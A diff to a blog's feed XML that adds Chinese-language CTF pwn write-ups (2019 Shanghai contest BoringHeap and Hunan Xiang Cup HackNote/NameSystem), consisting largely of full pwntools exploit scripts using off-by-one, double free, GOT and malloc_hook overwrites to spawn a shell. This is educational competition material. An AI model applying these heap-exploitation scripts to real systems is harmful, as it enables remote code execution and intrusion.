@@ -4,19 +4,40 @@
   
     
     <entry>
-      <title>湖湘杯2019复赛 pwn Writeup</title>
-      <link href="/2019/11/09/hxb2019pwn/"/>
-      <url>/2019/11/09/hxb2019pwn/</url>
+      <title>2019上海市大学生网络安全大赛-线上赛-pwn-BoringHeap Writeup</title>
+      <link href="/2019/11/16/sh2019boringheap/"/>
+      <url>/2019/11/16/sh2019boringheap/</url>
       
-        <content type="html"><![CDATA[<p>湖湘杯2019复赛pwn题的解题过程</p><a id="more"></a><h1 id="HackNote"><a href="#HackNote" class="headerlink" title="HackNote"></a>HackNote</h1><p>IDA打开发现是静态编译的堆题,没开任何保护,基本操作便是add(),delete(),edit().<br>特点是将malloc得到的指针放在了栈上rsp + 0x20的位置,而size则放在了rsp + 0x20 + 16*8 = rsp + 0xa0的位置,且因为是静态编译,无法使用pwngdb中的heap/fastbins/unsorted等指令,相当于增加了调试难度.</p><h2 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h2><h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off_by_one"></a>off_by_one</h3><p>题目中在edit时,修改新的size是用的strlen()函数,因此当我们将chunk中的内容与next_chunk的size连起来时,size就会被 + 2 因此就可以再次edit()来修改next_chunk的size</p><h3 id="堆重叠来获取main-arena-chunk"><a href="#堆重叠来获取main-arena-chunk" class="headerlink" title="堆重叠来获取main_arena_chunk"></a>堆重叠来获取main_arena_chunk</h3><p>具体过程见EXP</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">#encoding:utf-8from pwn import *sh = process(&#39;./HackNotenew&#39;)#sh = remote(&#39;183.129.189.62&#39;,21004)main_arena_88 = 0x00000000006ca858main_arena_0x61 = 0x6ca828malloc_hook = 0x6CB788chunk_ptr = 0x6cbc40context.log_level = &#39;DEBUG&#39;context(os=&quot;linux&quot;, arch=&quot;amd64&quot;)def add(size,content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Input the Size:&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Input the Note:&#39;)    sh.sendline(content)    sh.recvuntil(&#39;4. Exit&#39;)def add_full(size,content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Input the Size:&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Input the Note:&#39;)    sh.send(content)    sh.recvuntil(&#39;4. Exit&#39;)def delete(index):    sh.sendline(&#39;2&#39;)    sh.recvuntil(&#39;Input the Index of Note:&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;4. Exit&#39;)</code></pre><pre><code class="python">def edit(index,content):    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;Input the Index of Note:&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;Input the Note:&#39;)    sh.send(content)gdb.attach(sh)sh.recvuntil(&#39;4. Exit&#39;)add(0x108,&#39;aaaa&#39;) #0 暂时不能使用off_by_oneadd(0x200,&#39;b&#39; * 0x1f0 + p64(0x200) ) #1 0x200是fake_prev_size  add(0x100,&#39;cccc&#39;) #2 next_chunkadd(0x100,&#39;dddd&#39; ) #3edit(0,&#39;a&#39; * 0x108) # 这次修改将size改为了0x10a (本来的0x108 + next_chunk的size两字节)delete(1) # [2] prev_size = 0x210 size = 0x110edit(0,&#39;a&#39; * 0x108 + &#39;\n&#39;) # [1] size = 0x200 off_by_one修改add(0xa0,&#39;eeee&#39;) #1 切割原先free的 [1] 被修改的prev_size是一开始add()时写上去的0x200add(0x50,&#39;ffff&#39;) #4 add(0x40,&#39;gggg&#39;) #5# 堆重叠的两个fastbindelete(1)delete(2) #触发合并 size = 0x321 add(0x300,&#39;hhhh&#39;) #1 覆盖[4] [5] 两个fastbindelete(4) delete(5)edit(1,&#39;\x00&#39; * 0xa8 +  p64(0x60) + p64(0x51) + p64(0) *10 + p64(0x51) + p64(0x6cb820) + &#39;\n&#39;) # [4]-&gt;fd = 0x51 目的是修改main_arena 0x6ca828这个地址的值 [5] -&gt; fd = 0x6cb820 fake_chunk_in_main_arena 的地址add(0x50, &#39;aaa&#39;) #4 此时 *0x6ca828 = 0x51add(0x40, &#39;bbb&#39;) #5 此时 *0x6ca820 = 0x6ca820add(0x40, p64(0) * 5 + p64(malloc_hook - 0x10) ) #malloc()得到0x6ca830 修改 main_arena + 88 即 last_remainder 的值为 malloc_hook -0x10 的地址add(0x40, p64(0x6cb790) + asm(shellcraft.sh()) ) add(0x40, p64(0x6cb790) + asm(shellcraft.sh()) )add(0x40, p64(0x6cb790) + asm(shellcraft.sh()) ) #malloc()三次是因为之前的unsorted bin 还没切割完,优先级比last_remainder高sh.sendline(&#39;1&#39;)sh.sendlineafter(&quot;Input the Size:&quot;, &#39;64&#39;)sh.interactive()</code></pre><h1 id="NameSystem"><a href="#NameSystem" class="headerlink" title="NameSystem"></a>NameSystem</h1><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>利用doublefree获取 got表 0x60200a 这一地址的fake_chunk,然后修改free()的got表低四位为system()的0x5390 ,然后free()之前申请的内容为<code>/bin/sh</code>的chunk,若地址正确是就相当于<code>system(&#39;/bin/sh&#39;)</code>然后爆破三位获取shell</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *#context.log_level =&#39;DEBUG&#39;def add(size, content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Name Size:&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Name:&#39;)    sh.sendline(content)    sh.recvuntil(&#39;Your choice :&#39;)def delete(index):    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;The id you want to delete:&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;Your choice :&#39;)x = 1while (1):    log.info(&#39;time =&#39; + str(x))    x+=1    sh = process(&#39;./NameSystem&#39;)    #sh = remote(&#39;183.129.189.62&#39;,15905)    sh.recvuntil(&#39;Your choice :&#39;)    for i in range(18):        add(0x40,&#39;aaa&#39;)    #gdb.attach(sh)    add(0x50,&#39;bbb&#39;)    add(0x50,&#39;ccc&#39;)</code></pre><pre><code class="python">    delete(0)    delete(18)    delete(17)    delete(19)    delete(0)    delete(0)    delete(0)    delete(0)    add(0x50,p64(0x601ffa))    add(0x50,&#39;\x00&#39;)    add(0x50,&#39;/bin/sh\x00&#39;)    add(0x50,&#39;\x00&#39; * 14 + &#39;\x90\x53&#39;) #最后三位0x390确定 爆破0x005这三位 &#39;\x00&#39;来自于readin()函数的实现会将&#39;\n&#39;替换成&#39;\x00&#39;     try:        sh.sendline(&#39;3&#39;)        sh.recvuntil(&#39;The id you want to delete:&#39;)        sh.sendline(str(15))        sleep(0.2)        sh.sendline(&#39;ls&#39;)        sh.recv()        sh.sendline(&#39;ls&#39;)    except EOFError:        sh.close()        continue    else:        sh.interactive()</code></pre>]]></content>
+        <content type="html"><![CDATA[<p>2019上海市大学生网络安全大赛 线上赛pwn题BoringHeap的解题过程</p><a id="more"></a><h1 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h1><p><code>abs(0x80000000)</code>即int变量最小值 <code>-2147483648</code>时 因为返回值int范围无法表示<code>+2147483648</code>所以返回值还是<code>0x80000000</code>，在题目中表现为abs(0x80000000) % 0x30 = -32 因此可以在<code>edit()</code>函数中修改<code>chunk_size</code></p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>因为可以修改<code>chunk_size</code>,通过修改为<code>unsorted bin</code>再<code>free</code>获取libc基地址,之后通过堆重叠先将<code>fake_size</code>置入<code>main_arena</code>然后<code>malloc()</code>获取位于<code>main_arena</code>的chunk来修改<code>last_remainder</code>为<code>malloc_hook - 0x10</code>的地址，最后<code>malloc</code>修改其为<code>one_gadget</code>地址，获取shell</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">#encoding:utf-8from pwn import *context.log_level =&#39;DEBUG&#39;main_arena_88_offset = 0x3c4b78find_fake_fast_offset = 0x23malloc_hook_offset = 0x3c4b10 one_gadget_offset = 0xf1147# size : 1 0x20 2 0x30 3 0x40def add(size,content):     sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Large&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Input Content:&#39;)    sh.sendline(content)    sh.recvuntil(&#39;5.Exit&#39;)#  abs(-0x80000000)%0x30 = -32 = -0x20def add_full_content(size,content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Large&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Input Content:&#39;)    sh.send(content)    sh.recvuntil(&#39;5.Exit&#39;)def edit(index,offset,content):    sh.sendline(&#39;2&#39;)    sh.recvuntil(&#39;Which one do you want to update?&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;Where you want to update?&#39;)    sh.sendline(str(offset))    sh.recvuntil(&#39;Input Content:&#39;)    sh.sendline(content)    sh.recvuntil(&#39;5.Exit&#39;)</code></pre><pre><code class="python">def delete(index):    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;Which one do you want to delete?&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;5.Exit&#39;)def show(index):    sh.sendline(&#39;4&#39;)    sh.recvuntil(&#39;Which one do you want to view?&#39;)    sh.sendline(str(index))    recv_content = sh.recvuntil(&#39;5.Exit&#39;)    return recv_contentsh = process(&#39;./boringheap&#39;)#gdb.attach(sh)add(1,&#39;aaa&#39;) #0 add(2,&#39;bbb&#39;) #1add(3,&#39;ccc&#39;) #2add(2,&#39;ddd&#39;) #3add(2,&#39;eee&#39;) #4edit(1,0x80000000,&#39;\x00&#39; * 0x18 + p64(0xD1) )# 0xD1 = 0x40 + 0x50 + 0x40 + 1 用于堆重叠 delete(1)add(2,&#39;f&#39;) #5 切割0x41的[1] content  = show(2)libc_base = u64(content[1:7].ljust(8,&#39;\x00&#39;)) - main_arena_88_offsetlog.info(&#39;libc_base = &#39; + hex(libc_base))add(3,&#39;aaa&#39;) #6 堆重叠 地址同 [2]add(2,&#39;bbb&#39;) #7 同[3]delete(3) edit(7,0,p64(0x51)) add(2,&#39;ccc&#39;) # 将fake_size = 0x51置入main_arena</code></pre><pre><code class="python">delete(2)edit(6,0,p64(libc_base + 0x3c4b20 + 0x10)) # main_arenaadd(3,&#39;aaa&#39;)add_full_content(3,p64(0) * 7 + p64(libc_base + 0x3c4b10 - 0x10)) #malloc_hookadd(3,p64(libc_base + one_gadget_offset))sh.sendline(&#39;1&#39;)sh.sendline(&#39;1&#39;)sh.interactive()</code></pre>]]></content>
       
       
       
         <tags>
             
+            <tag> ctf </tag>
+            
             <tag> pwn </tag>
             
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>湖湘杯2019复赛 pwn Writeup</title>
+      <link href="/2019/11/09/hxb2019pwn/"/>
+      <url>/2019/11/09/hxb2019pwn/</url>
+      
+        <content type="html"><![CDATA[<p>湖湘杯2019复赛pwn题的解题过程</p><a id="more"></a><h1 id="HackNote"><a href="#HackNote" class="headerlink" title="HackNote"></a>HackNote</h1><p>IDA打开发现是静态编译的堆题,没开任何保护,基本操作便是add(),delete(),edit().<br>特点是将malloc得到的指针放在了栈上rsp + 0x20的位置,而size则放在了rsp + 0x20 + 16*8 = rsp + 0xa0的位置,且因为是静态编译,无法使用pwngdb中的heap/fastbins/unsorted等指令,相当于增加了调试难度.</p><h2 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h2><h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off_by_one"></a>off_by_one</h3><p>题目中在edit时,修改新的size是用的strlen()函数,因此当我们将chunk中的内容与next_chunk的size连起来时,size就会被 + 2 因此就可以再次edit()来修改next_chunk的size</p><h3 id="堆重叠来获取main-arena-chunk"><a href="#堆重叠来获取main-arena-chunk" class="headerlink" title="堆重叠来获取main_arena_chunk"></a>堆重叠来获取main_arena_chunk</h3><p>具体过程见EXP</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">#encoding:utf-8from pwn import *sh = process(&#39;./HackNotenew&#39;)#sh = remote(&#39;183.129.189.62&#39;,21004)main_arena_88 = 0x00000000006ca858main_arena_0x61 = 0x6ca828malloc_hook = 0x6CB788chunk_ptr = 0x6cbc40context.log_level = &#39;DEBUG&#39;context(os=&quot;linux&quot;, arch=&quot;amd64&quot;)def add(size,content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Input the Size:&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Input the Note:&#39;)    sh.sendline(content)    sh.recvuntil(&#39;4. Exit&#39;)def add_full(size,content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Input the Size:&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Input the Note:&#39;)    sh.send(content)    sh.recvuntil(&#39;4. Exit&#39;)def delete(index):    sh.sendline(&#39;2&#39;)    sh.recvuntil(&#39;Input the Index of Note:&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;4. Exit&#39;)</code></pre><pre><code class="python">def edit(index,content):    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;Input the Index of Note:&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;Input the Note:&#39;)    sh.send(content)gdb.attach(sh)sh.recvuntil(&#39;4. Exit&#39;)add(0x108,&#39;aaaa&#39;) #0 暂时不能使用off_by_oneadd(0x200,&#39;b&#39; * 0x1f0 + p64(0x200) ) #1 0x200是fake_prev_size  add(0x100,&#39;cccc&#39;) #2 next_chunkadd(0x100,&#39;dddd&#39; ) #3edit(0,&#39;a&#39; * 0x108) # 这次修改将size改为了0x10a (本来的0x108 + next_chunk的size两字节)delete(1) # [2] prev_size = 0x210 size = 0x110edit(0,&#39;a&#39; * 0x108 + &#39;\n&#39;) # [1] size = 0x200 off_by_one修改add(0xa0,&#39;eeee&#39;) #1 切割原先free的 [1] 被修改的prev_size是一开始add()时写上去的0x200add(0x50,&#39;ffff&#39;) #4 add(0x40,&#39;gggg&#39;) #5# 堆重叠的两个fastbindelete(1)delete(2) #触发合并 size = 0x321 add(0x300,&#39;hhhh&#39;) #1 覆盖[4] [5] 两个fastbindelete(4) delete(5)edit(1,&#39;\x00&#39; * 0xa8 +  p64(0x60) + p64(0x51) + p64(0) *10 + p64(0x51) + p64(0x6cb820) + &#39;\n&#39;) # [4]-&gt;fd = 0x51 目的是修改main_arena 0x6ca828这个地址的值 [5] -&gt; fd = 0x6cb820 fake_chunk_in_main_arena 的地址add(0x50, &#39;aaa&#39;) #4 此时 *0x6ca828 = 0x51add(0x40, &#39;bbb&#39;) #5 此时 *0x6ca820 = 0x6ca820add(0x40, p64(0) * 5 + p64(malloc_hook - 0x10) ) #malloc()得到0x6ca830 修改 main_arena + 88 即 last_remainder 的值为 malloc_hook -0x10 的地址add(0x40, p64(0x6cb790) + asm(shellcraft.sh()) ) add(0x40, p64(0x6cb790) + asm(shellcraft.sh()) )add(0x40, p64(0x6cb790) + asm(shellcraft.sh()) ) #malloc()三次是因为之前的unsorted bin 还没切割完,优先级比last_remainder高sh.sendline(&#39;1&#39;)sh.sendlineafter(&quot;Input the Size:&quot;, &#39;64&#39;)sh.interactive()</code></pre><h1 id="NameSystem"><a href="#NameSystem" class="headerlink" title="NameSystem"></a>NameSystem</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>利用doublefree获取 got表 0x60200a 这一地址的fake_chunk,然后修改free()的got表低四位为system()的0x5390 ,然后free()之前申请的内容为<code>/bin/sh</code>的chunk,若地址正确是就相当于<code>system(&#39;/bin/sh&#39;)</code>然后爆破三位获取shell</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *#context.log_level =&#39;DEBUG&#39;def add(size, content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Name Size:&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Name:&#39;)    sh.sendline(content)    sh.recvuntil(&#39;Your choice :&#39;)def delete(index):    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;The id you want to delete:&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;Your choice :&#39;)x = 1while (1):    log.info(&#39;time =&#39; + str(x))    x+=1    sh = process(&#39;./NameSystem&#39;)    #sh = remote(&#39;183.129.189.62&#39;,15905)    sh.recvuntil(&#39;Your choice :&#39;)    for i in range(18):        add(0x40,&#39;aaa&#39;)    #gdb.attach(sh)    add(0x50,&#39;bbb&#39;)    add(0x50,&#39;ccc&#39;)</code></pre><pre><code class="python">    delete(0)    delete(18)    delete(17)    delete(19)    delete(0)    delete(0)    delete(0)    delete(0)    add(0x50,p64(0x601ffa))    add(0x50,&#39;\x00&#39;)    add(0x50,&#39;/bin/sh\x00&#39;)    add(0x50,&#39;\x00&#39; * 14 + &#39;\x90\x53&#39;) #最后三位0x390确定 爆破0x005这三位 &#39;\x00&#39;来自于readin()函数的实现会将&#39;\n&#39;替换成&#39;\x00&#39;     try:        sh.sendline(&#39;3&#39;)        sh.recvuntil(&#39;The id you want to delete:&#39;)        sh.sendline(str(15))        sleep(0.2)        sh.sendline(&#39;ls&#39;)        sh.recv()        sh.sendline(&#39;ls&#39;)    except EOFError:        sh.close()        continue    else:        sh.interactive()</code></pre><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>先将<code>ptr[0]</code>修改为got表地址用于泄露libc地址，然后修改<code>free_got</code>为<code>puts_plt</code>，这样在<code>delete(0)</code>时就能得到libc地址,同时需要在got表段留下<code>size = 0x41</code>的fake_size用于再次修改<code>free_got</code>为<code>system</code>,此时delete()内容为<code>/bin/sh</code>的chunk就能getshell</p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">#encoding:utf-8from pwn import *from LibcSearcher import LibcSearchercontext.log_level =&#39;DEBUG&#39;def add(size, content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Name Size:&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Name:&#39;)    sh.sendline(content)    sh.recvuntil(&#39;Your choice :&#39;)def delete(index):    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;The id you want to delete:&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;Your choice :&#39;)sh = process(&#39;./NameSystem&#39;)sh.recvuntil(&#39;Your choice :&#39;)for i in range(18):    add(0x40,&#39;aaa&#39;)</code></pre><pre><code class="python">#gdb.attach(sh)#三次double freeadd(0x50,&#39;bbb&#39;)add(0x50,&#39;ccc&#39;)delete(0)delete(18)delete(17)delete(19)delete(0)add(0x60,&#39;ddd&#39;)add(0x60,&#39;eee&#39;)delete(0)delete(18)delete(17)delete(19)delete(0)add(0x30,&#39;fff&#39;)add(0x30,&#39;ggg&#39;)delete(0)    delete(18)delete(17)delete(19)delete(0)for i in range(12):    delete(0)#令ptr[0] = 0x602060 即atoi_got 用于待会的puts libc地址add(0x60,p64(0x60208d))add(0x60,p64(0))add(0x60,&#39;/bin/sh\x00&#39;) # 此处/bin/sh没有特别意义add(0x60,&#39;\x00&#39;*3 + p64(0x602060)) </code></pre><pre><code class="python">#修改free_got 为 puts_plt add(0x50,p64(0x601ffa))add(0x50,p64(0))add(0x50,&#39;/bin/sh\x00&#39;)add(0x50,&#39;\x00&#39; * 0x6 + p64(0x41) + p32(0x4006a0) + &#39;\x00&#39; *3 ) # &#39;\x00&#39; * 0x6 + p64(0x41) 是加起来长度0xe的 padding 0x41 是为了等会再次修改free_got时malloc(0x30)留下的fake_chunk_size # p32(0x4006a0) + &#39;\x00&#39; *3 再加上会被readin()修改为&#39;\x00&#39;的&#39;\n&#39; 一共8字节 如果用p64(0x4006a0) 会越界一字节导致报错sh.sendline(&#39;3&#39;)sh.recvuntil(&#39;The id you want to delete:&#39;)sh.sendline(&#39;0&#39;)atoi_addr = u64(sh.recvuntil(&#39;\n&#39;)[:-1].ljust(8,&#39;\x00&#39;))libc = LibcSearcher(&#39;atoi&#39;,atoi_addr)libc_base = atoi_addr - libc.dump(&#39;atoi&#39;)log.info(&#39;libc_base = &#39; + hex(libc_base))system_addr = libc_base + libc.dump(&#39;system&#39;)#泄露libc地址add(0x30, p64(0x602008))add(0x30,p64(0))add(0x30,&#39;/bin/sh\x00&#39;)add(0x30,p64(system_addr)[:7] )#再次修改free_got为system_addr [:7] 也是防止越界sh.sendline(&#39;3&#39;)sh.recvuntil(&#39;The id you want to delete:&#39;)sh.sendline(&#39;15&#39;)sh.interactive()</code></pre>]]></content>
+      
+      
+      
+        <tags>
+            
             <tag> ctf </tag>
+            
+            <tag> pwn </tag>
             
         </tags>
       
@@ -35,9 +56,9 @@
       
         <tags>
             
-            <tag> pwn </tag>
-            
             <tag> ctf </tag>
+            
+            <tag> pwn </tag>
             
         </tags>
       
@@ -56,9 +77,9 @@
       
         <tags>
             
-            <tag> pwn </tag>
-            
             <tag> ctf </tag>
+            
+            <tag> pwn </tag>
             
         </tags>
       
@@ -77,9 +98,9 @@
       
         <tags>
             
-            <tag> pwn </tag>
-            
             <tag> ctf </tag>
+            
+            <tag> pwn </tag>
             
         </tags>
       
@@ -98,9 +119,9 @@
       
         <tags>
             
-            <tag> pwn </tag>
-            
             <tag> ctf </tag>
+            
+            <tag> pwn </tag>
             
         </tags>
       
@@ -119,9 +140,9 @@
       
         <tags>
             
-            <tag> pwn </tag>
-            
             <tag> ctf </tag>
+            
+            <tag> pwn </tag>
             
         </tags>
       
@@ -140,9 +161,9 @@
       
         <tags>
             
-            <tag> pwn </tag>
-            
             <tag> ctf </tag>
+            
+            <tag> pwn </tag>
             
         </tags>
       
@@ -161,9 +182,9 @@
       
         <tags>
             
-            <tag> pwn </tag>
-            
             <tag> ctf </tag>
+            
+            <tag> pwn </tag>
             
         </tags>
       
@@ -201,9 +222,9 @@
       
         <tags>
             
-            <tag> pwn </tag>
-            
             <tag> ctf </tag>
+            
+            <tag> pwn </tag>
             
         </tags>
       
